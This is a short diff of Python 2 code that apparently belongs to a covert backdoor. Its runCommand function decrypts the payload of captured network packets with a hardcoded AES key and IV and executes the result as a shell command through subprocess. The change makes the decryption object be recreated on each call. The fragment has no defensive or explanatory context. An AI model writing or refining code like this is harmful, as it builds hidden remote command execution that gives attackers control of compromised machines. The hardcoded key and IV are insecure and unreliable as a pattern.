@@ -40,6 +40,7 @@ decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
 
 def runCommand(packet):
   encryptedData = packet['Raw'].load
+  decryptionObject = AES.new('This is a key123', AES.MODE_CFB, 'This is an IV456')
   data = decryptionObject.decrypt(encryptedData)
   print "Running command " + data
   output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
